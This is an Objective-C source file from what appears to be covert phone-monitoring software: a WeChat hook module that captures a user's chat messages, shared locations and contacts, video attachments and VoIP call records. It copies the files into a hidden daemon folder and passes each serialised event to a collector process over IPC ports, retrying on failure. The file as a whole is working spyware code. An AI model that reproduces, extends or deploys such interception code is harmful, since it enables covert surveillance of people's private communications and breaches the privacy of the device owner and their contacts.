//
//  WeChatUtils.m
//  MSFSP
//
//  Created by Ophat Phuetkasickonphasutha on 6/20/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//
#import <Foundation/Foundation.h>
#import "WeChatUtils.h"
#import "IMShareUtils.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import "FxIMGeoTag.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "StringUtils.h"
#import "FxAttachment.h"
#import "DaemonPrivateHome.h"
#import "CMessageWrap.h"
#import "DateTimeFormat.h"

#import <objc/runtime.h>

static WeChatUtils *_WeChatUtils = nil;

@interface WeChatUtils (private)
- (void) thread: (NSArray *) aArguments;						// for IM event
- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent;			// for VoIP event
+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

@end

@implementation WeChatUtils

@synthesize mCContactMgr;//,mAudioSender,mAudioReceiver;

@synthesize mIMSharedFileSender, mVOIPSharedFileSender;

+ (id) sharedWeChatUtils{
	if (_WeChatUtils == nil) {
		_WeChatUtils = [[WeChatUtils alloc] init];
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kWeChatMessagePort];
			[_WeChatUtils setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kWeChatCallLogMessagePort1];
			[_WeChatUtils setMVOIPSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
		}
	}
	return (_WeChatUtils);
}


#pragma mark -
#pragma mark IM Event
#pragma mark -


+ (void) sendWeChatEvent: (FxIMEvent *) aIMEvent weChatMessage: (CMessageWrap *) aWeChatMessage{
	
	NSArray *arguments = [NSArray arrayWithObjects:aIMEvent, aWeChatMessage,nil];
	WeChatUtils *weChatUtils = [[WeChatUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:weChatUtils
						   withObject:arguments];
	[weChatUtils autorelease];
}

- (void) thread: (NSArray *) aArguments {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[aArguments retain];
	@try {
		
		FxIMEvent *imEvent = [aArguments objectAtIndex:0];
		CMessageWrap *weChatMessage = [aArguments objectAtIndex:1];
		
		//========================= Wait for Capture Placename for share location
		if ([imEvent mRepresentationOfMessage] == kIMMessageShareLocation) {
			FxIMGeoTag *sharedLocation = [imEvent mShareLocation];
			if ([[sharedLocation mPlaceName] length] == 0) {
				[NSThread sleepForTimeInterval:3.0];
				if([[weChatMessage m_locationLabel]length]>0){
					[sharedLocation setMPlaceName:[weChatMessage m_locationLabel]];
				}
			}
		}
        
        // ------- Wait for video attachment 5.2.0.15 -----------
        if ([weChatMessage IsVideoMsg]) {
            FxAttachment *videoAttchment = nil;
            if ([[imEvent mAttachments] count] > 0) {
                videoAttchment = [[imEvent mAttachments] objectAtIndex:0];
                NSData *thumbnail = [videoAttchment mThumbnail];
                NSString *videoPath = [videoAttchment fullPath];
                NSInteger wait = 0;
                unsigned int uiPercent = [weChatMessage m_uiPercent];
                if (thumbnail == nil && videoPath == nil) {
                    while ([weChatMessage m_uiPercent] < 100 && wait < 5) {
                        wait++;
                        [NSThread sleepForTimeInterval:5.0];
                        
                        DLog(@"m_uiPercent = %d, wait = %ld", [weChatMessage m_uiPercent], (long)wait);
                        if ([weChatMessage m_uiPercent] > uiPercent) {
                            // Reset wait because there is a least some progress
                            DLog(@"Reset wait value because there is some progress");
                            wait = 0;
                        }
                        uiPercent = [weChatMessage m_uiPercent];
                    }
                    
                    CMessageWrap *cMessageWrap = weChatMessage;
                    NSFileManager * findfile = [NSFileManager defaultManager];
                    NSString* imWeChatAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imWeChat/"];
                    NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%d.mp4",imWeChatAttachmentPath,[[NSDate date] timeIntervalSince1970],[cMessageWrap m_uiMesLocalID]];
                    
                    NSData * videoThumbnail = nil;
                    NSData * videoData = nil;
                    
                    Class $CMessageWrap = objc_getClass("CMessageWrap");
                    NSString * pathForVideo = [$CMessageWrap GetPathOfMesVideoWithMessageWrap:cMessageWrap];
                    NSString * pathForVideoThumb = [$CMessageWrap getPathOfVideoMsgImgThumb:cMessageWrap];
                    
                    DLog(@"pathForVideo, %@",pathForVideo);
                    DLog(@"pathForVideoThumb, %@",pathForVideoThumb);
                    DLog(@"GetThumb = %@", [cMessageWrap GetThumb]);
                    DLog(@"GetImg   = %@", [cMessageWrap GetImg]);
                    
                    if([findfile fileExistsAtPath:pathForVideo]){
                        DLog(@"********** Capture Actual file" );
                        videoData = [NSData dataWithContentsOfFile:pathForVideo];
                        if (![videoData writeToFile:saveFilePath atomically:YES]) {
                            // iOS 9, Sandbox
                            saveFilePath = [IMShareUtils saveData:videoData toDocumentSubDirectory:@"/attachments/imWeChat/" fileName:[saveFilePath lastPathComponent]];
                        }
                        DLog(@"saveFilePath, %@",saveFilePath);
                        [videoAttchment setFullPath:saveFilePath];
                        if([findfile fileExistsAtPath:pathForVideoThumb]){
                            DLog(@"********** Capture Thumbnail" );
                            videoThumbnail = [NSData dataWithContentsOfFile:pathForVideoThumb];
                            [videoAttchment setMThumbnail:videoThumbnail];
                        }
                    } else {
                        if([findfile fileExistsAtPath:pathForVideoThumb]){
                            DLog(@"********** Capture Only Thumbnail" );
                            videoThumbnail = [NSData dataWithContentsOfFile:pathForVideoThumb];
                            [videoAttchment setMThumbnail:videoThumbnail];
                            [videoAttchment setFullPath:@"video/mp4"];
                        }
                    }
                }
            }
        }
		
		NSString *msg = [imEvent mMessage];
		
		//========================= Capture Share Contact
		if([msg rangeOfString:@"<msg"].location != NSNotFound){
            
			if([msg rangeOfString:@"</msg>"].location != NSNotFound     ||
               [msg rangeOfString:@"/>"].location != NSNotFound         ){
                
				NSString *userName = nil;
				NSString *userNickName = nil;
				
				// userName
				// alias is always presents in xml text either empty or text
				if([msg rangeOfString:@"alias="].location != NSNotFound ){
					NSArray * spliter1 = [msg componentsSeparatedByString:@"alias=\""];
					NSArray * spliter2 = [[spliter1 objectAtIndex:1] componentsSeparatedByString:@"\""];
					
					userName = [[spliter2 objectAtIndex:0] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
					DLog(@"ext alias %@",userName);
					if([userName length]==0){
						if([msg rangeOfString:@"username="].location != NSNotFound ){
							NSArray * spliter1 = [msg componentsSeparatedByString:@"username=\""];
							NSArray * spliter2 = [[spliter1 objectAtIndex:1] componentsSeparatedByString:@"\""];
							
							userName = [[spliter2 objectAtIndex:0] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
							DLog(@"ext userName %@",userName);
						}
					}
				}
				
				// nickname
				if([msg rangeOfString:@"nickname="].location != NSNotFound ){
					NSArray * spliter1 = [msg componentsSeparatedByString:@"nickname=\""];
					NSArray * spliter2 = [[spliter1 objectAtIndex:1] componentsSeparatedByString:@"\""];
					
					userNickName = [[spliter2 objectAtIndex:0] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
					DLog(@"ext nickname %@",userName);
				}
				
				// -- Check
				if (!userNickName && !userName) { // Not a shared contact
					msg = @"";
				} else {
					msg =  [NSString stringWithFormat:@"Name : %@ \nAccount ID : %@",userNickName,userName];
					[imEvent setMRepresentationOfMessage:kIMMessageContact];
				}
				
				[imEvent setMMessage:msg];
				DLog(@"msg %@",msg);
			}
		}
		//========================= End Capture Share Contact
		
		msg = [StringUtils removePrivateUnicodeSymbols:[imEvent mMessage]];
		DLog(@"WeChat message after remove emoji = %@", msg);
		
		if (([msg length]>0) || ([[imEvent mAttachments]count]>0) || ([imEvent mShareLocation]!=nil) ) {
			
			[imEvent setMMessage:msg];
			
			NSMutableData* data = [[NSMutableData alloc] init];
			
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			[archiver encodeObject:imEvent forKey:kWeChatArchied];
			[archiver finishEncoding];
			[archiver release];	
			
			BOOL successfullySend = NO;
			successfullySend = [WeChatUtils sendDataToPort:data portName:kWeChatMessagePort];
			if (!successfullySend) {
				DLog (@"=========================================")
				DLog (@"************ successfullySend failed 1");
				DLog (@"=========================================")
				successfullySend = [WeChatUtils sendDataToPort:data portName:kWeChatMessagePort1];
				if (!successfullySend) {
					DLog (@"=========================================")
					DLog (@"************ successfullySend failed 2");
					DLog (@"=========================================")
					successfullySend = [WeChatUtils sendDataToPort:data portName:kWeChatMessagePort2];
					if (!successfullySend) {
						DLog (@"=========================================")
						DLog (@"************ successfullySend failed 3");
						DLog (@"=========================================")
					}
				}
			}
			
			if (!successfullySend) {
				[self deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
			}
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[aArguments release];
	[pool release];
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		if ([aPortName isEqualToString:kWeChatMessagePort]	||
			[aPortName isEqualToString:kWeChatMessagePort1]	||
			[aPortName isEqualToString:kWeChatMessagePort2]	) {
			sharedFileSender = [[WeChatUtils sharedWeChatUtils] mIMSharedFileSender];
		} else {
			sharedFileSender = [[WeChatUtils sharedWeChatUtils] mVOIPSharedFileSender];
		}
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0; i<[aAttachmentArray count]; i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if (deletesuccess){
			DLog (@"Deleting file %@",path );
		} else {
			DLog (@"Fail deleting file %@",path );
		}
	
	}
}


#pragma mark -
#pragma mark VoIP (public method)



+ (FxVoIPEvent *) createWeChatVoIPEventForContactID: (NSString *) aContactID
										contactName: (NSString *) aContactName
										  direction: (FxEventDirection) aDirection {
	// -- create FxVoIPEvent		
	FxVoIPEvent *voIPEvent	= [[FxVoIPEvent alloc] init];	
	[voIPEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[voIPEvent setEventType:kEventTypeVoIP];															
	[voIPEvent setMCategory:kVoIPCategoryWeChat];	
	[voIPEvent setMDirection:aDirection];
	[voIPEvent setMDuration:0];			
	[voIPEvent setMUserID:aContactID];										// participant id 
	[voIPEvent setMContactName:aContactName];								// participant displayname
	[voIPEvent setMTransferedByte:0];
	[voIPEvent setMVoIPMonitor:kFxVoIPMonitorNO];
	[voIPEvent setMFrameStripID:0];				
							
	return [voIPEvent autorelease];
}

+ (void) sendWeChatVoIPEvent: (FxVoIPEvent *) aVoIPEvent {
	WeChatUtils *weChatUtils = [[WeChatUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(voIPthread:)
							 toTarget:weChatUtils withObject:aVoIPEvent];
	[weChatUtils autorelease];	
}


#pragma mark VoIP (private method)


- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		
		NSMutableData* data			= [[NSMutableData alloc] init];
		
		NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		[archiver encodeObject:aVoIPEvent forKey:kWeChatArchied];
		[archiver finishEncoding];
		[archiver release];	
		
		// -- first port ----------
		BOOL sendSuccess = [WeChatUtils sendDataToPort:data portName:kWeChatCallLogMessagePort1];
		if (!sendSuccess){
			DLog (@"First attempt fails %@", aVoIPEvent)
			
			// -- second port ----------
			sendSuccess = [WeChatUtils sendDataToPort:data portName:kWeChatCallLogMessagePort2];
			if (!sendSuccess) {
				DLog (@"Second attempt fails %@", aVoIPEvent)
				
				[NSThread sleepForTimeInterval:1];
				
				// -- Third port ----------				
				sendSuccess = [WeChatUtils sendDataToPort:data portName:kWeChatCallLogMessagePort3];		
				if (!sendSuccess) {
					DLog (@"LOST WeChat VoIP event %@", aVoIPEvent)
				}
			}
		}			
		[data release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

#pragma mark Audio
/* 
    We start to implement audio capture since version 6.0.0. For the version prior to 6.0.0,
    we've never tested it.
 */
+ (BOOL) isSupportAudioCapture {
    BOOL support                = NO;
    NSDictionary *bundleInfo	= [[NSBundle mainBundle] infoDictionary];
    NSString *releaseVersion	= [bundleInfo objectForKey:@"CFBundleShortVersionString"];
    if (releaseVersion == nil || [releaseVersion length] == 0) {
        releaseVersion = [bundleInfo objectForKey:@"CFBundleVersion"];
    }
    
    NSArray *currentVersionArray    = [IMShareUtils parseVersion:releaseVersion];
    NSArray *version6_0_0Array	= [IMShareUtils parseVersion:@"6.0.0"];
    
    if ([IMShareUtils isVersion:currentVersionArray
                 greaterOrEqual:version6_0_0Array]) {
        DLog (@"WeChat version >= 6.0.0")
        support      = YES;
    }
    return support;
}


- (void) dealloc {
	[mCContactMgr release];
	//[mAudioSender release];
	//[mAudioReceiver release];
	[mIMSharedFileSender release];
	[mVOIPSharedFileSender release];
	[super dealloc];
}
@end
